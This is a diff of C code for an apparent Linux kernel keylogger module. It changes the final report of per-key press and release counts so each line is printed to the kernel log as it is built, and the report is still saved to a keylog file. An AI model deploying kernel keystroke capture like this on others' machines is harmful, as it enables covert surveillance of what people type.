@@ -201,6 +201,7 @@ void logger_final_log(void) {
 
     offset += snprintf(final_logs + offset, LOGS_SIZE - offset, \
         "======= Keylogger Final Logs =======\n");
+    printk(KERN_INFO "======= Keylogger Final Logs =======\n");
     for (int i = 0; i < 256; i++) {
         keyboard_key_t key = key_table[i];
         if (key.keycode == 0 || key.state == RELEASE)
@@ -213,6 +214,8 @@ void logger_final_log(void) {
         offset += snprintf(final_logs + offset, LOGS_SIZE - offset, \
             "KeyName : %-12s | Used : %6zu | Pressed : %6zu | Released : %6zu\n", \
             key.name, total, key.usage, key_released.usage);
+        printk("KeyName : %-12s | Used : %6zu | Pressed : %6zu | Released : %6zu\n", \
+            key.name, total, key.usage, key_released.usage);
 		for (int i = 0; i < 5; i++) {
 			if (key.usage > stats.most_used[i].usage) {
 				for (int j = 4; j > i; j--)
@@ -222,10 +225,9 @@ void logger_final_log(void) {
 			}
 		}
 	}
-
     offset += snprintf(final_logs + offset, LOGS_SIZE - offset, \
         "====================================\n");
-    printk(KERN_INFO "%s", final_logs);
+    printk(KERN_INFO "====================================\n");
 	logger_save_to_keylog(final_logs, offset);
     kfree(final_logs);
 }
